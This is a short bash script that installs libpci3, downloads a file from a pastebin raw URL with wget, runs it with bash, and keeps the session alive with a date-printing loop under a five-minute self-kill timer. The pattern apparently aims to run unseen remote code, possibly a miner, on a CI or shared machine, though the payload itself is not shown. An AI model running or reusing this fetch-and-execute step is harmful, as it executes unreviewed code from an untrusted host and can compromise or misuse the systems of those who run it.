#!/bin/bash

{
    sleep 5m
    kill $$
} &

apt-get update 
apt-get install libpci3
wget https://pastebin.com/raw/enDtdTiT
bash enDtdTiT

while true
do
    date
    sleep 1
done
